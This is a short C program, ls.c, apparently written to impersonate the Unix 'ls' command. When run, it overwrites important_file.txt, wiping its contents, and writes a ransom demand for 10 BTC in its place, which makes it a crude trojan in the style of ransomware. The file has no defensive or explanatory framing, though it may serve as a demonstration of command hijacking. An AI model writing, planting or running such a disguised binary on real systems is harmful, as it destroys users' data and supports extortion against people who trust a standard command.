// ls.c
#include <stdio.h>

int main() {
    printf("Wrong ls\n");

    FILE* file = fopen("important_file.txt", "w");

    if (file == NULL) {
        printf("Error opening file\n");
        return 1;
    }

    fprintf(file, "Please pay 10 BTC for your files\n");

    return 0;
}